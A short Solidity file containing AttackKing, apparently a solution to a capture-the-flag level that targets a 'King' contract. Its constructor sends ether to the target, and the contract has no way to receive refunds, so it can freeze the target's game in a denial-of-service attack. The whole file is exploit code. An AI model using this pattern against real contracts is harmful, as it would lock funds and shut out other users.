// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {}

contract AttackKing {
    constructor(address _king) payable {
        payable(_king).call{value: msg.value}("");
    }
}
